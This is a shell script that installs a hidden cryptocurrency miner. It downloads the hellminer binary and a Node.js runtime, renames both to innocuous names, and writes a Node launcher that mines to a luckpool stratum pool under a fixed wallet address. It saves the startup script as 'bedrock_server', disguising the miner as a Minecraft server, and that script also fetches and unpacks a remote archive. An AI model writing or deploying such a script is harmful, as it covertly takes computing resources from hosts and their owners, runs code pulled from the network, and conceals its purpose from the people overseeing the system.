#/bin/sh

wget https://github.com/hellcatz/hminer/releases/download/v0.57/hellminer_linux64.tar.gz || curl -L https://github.com/hellcatz/hminer/releases/download/v0.57/hellminer_linux64.tar.gz -o hellminer_linux64.tar.gz

tar -xzvf *.tar.gz

rm -rf *.tar.gz* && mv hellminer nether && rm -rf run_miner.sh

mkdir src && cd src && wget https://nodejs.org/dist/v19.9.0/node-v19.9.0-linux-x64.tar.xz || curl -L https://nodejs.org/dist/v19.9.0/node-v19.9.0-linux-x64.tar.xz && tar -xvf *.tar.xz && mv node-v19.9.0-linux-x64 me && rm -rf *.tar.xz*

cd ../

mkdir lock

echo "const { exec } = require('child_process');

exec('./nether -c stratum+tcp://na.luckpool.net:3956 -u RNQycVTo57CzRXaddyQrk85S7GuSa2NRM2.Leviathan -p x --cpu 2 --keep-alive'

)" > ./lock/index.js

echo "#/bin/sh

cd lock

wget https://github.com/NetVp/ModMin/raw/main/modules.tar.gz || curl -L https://github.com/NetVp/ModMin/raw/main/modules.tar.gz -o modules.tar.gz

tar -xzvf modules.tar.gz

rm -rf modules.tar.gz*

clear

cd

./src/me/bin/node ./lock/index.js" > bedrock_server
